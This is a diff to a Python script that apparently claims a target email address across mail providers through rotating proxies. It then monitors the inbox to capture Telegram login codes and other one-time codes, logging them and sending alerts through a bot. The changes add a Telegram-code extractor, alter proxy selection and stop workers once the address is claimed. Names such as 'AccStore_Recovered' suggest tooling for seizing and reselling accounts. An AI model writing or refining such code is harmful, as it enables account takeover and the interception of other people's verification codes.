@@ -10,6 +10,7 @@ import httpx
 
 from app import proxies
 from app.config import BOT_TOKEN, DATA_DIR, MAIL_USE_PROXY
+from app.mail_engine import CODE_LEN, extract_telegram_code
 
 TARGET_EMAIL = os.getenv("MAIL_TARGET", "").strip().lower()
 NEW_PASSWORD = os.getenv("MAIL_TARGET_PASSWORD", "AccStore_Recovered2026!")
@@ -34,7 +35,8 @@ stop = asyncio.Event()
 def _proxy_for(index: int) -> str:
     if not MAIL_USE_PROXY or not proxies.POOL:
         return ""
-    return proxies.get(index)
+    proxy, _ = proxies.pick(index)
+    return proxy
 
 
 async def alert(text: str):
@@ -69,6 +71,11 @@ async def _attempt(client: httpx.AsyncClient, base: str, proxy: str) -> tuple[st
     return "error", ""
 
 
+def _pick_otp(body: str) -> str:
+    found = re.findall(r"\b(\d{5,6})\b", body)
+    return extract_telegram_code(body, CODE_LEN) or (found[0] if found else "unknown")
+
+
 async def monitor(token: str, base: str, proxy: str):
     seen: set[str] = set()
     fails = 0
@@ -95,7 +102,6 @@ async def monitor(token: str, base: str, proxy: str):
                         if fresh:
                             token = fresh
                             stats["token"] = fresh
-                            headers["Authorization"] = f"Bearer {fresh}"
                             c.headers["Authorization"] = f"Bearer {fresh}"
                             fails = 0
                             continue
@@ -125,8 +131,7 @@ async def monitor(token: str, base: str, proxy: str):
                     continue
                 data = full.json() or {}
                 body = f"{data.get('subject', '')} {data.get('text', '') or data.get('html', '')}"
-                found = re.findall(r"\b(\d{5,6})\b", body)
-                otp = found[0] if found else "unknown"
+                otp = _pick_otp(body)
                 try:
                     with open(OTP_FILE, "a", encoding="utf-8") as f:
                         f.write(f"[{datetime.now().isoformat()}] {otp} {body[:500]}\n")
@@ -144,6 +149,8 @@ async def claim_worker(index: int):
 
     async with httpx.AsyncClient(timeout=10, headers={"User-Agent": UA}) as c:
         while not stop.is_set():
+            if stats["claimed"]:
+                return
             name, base = PROVIDERS[turn % len(PROVIDERS)]
             turn += 1
             stats["requests"] += 1
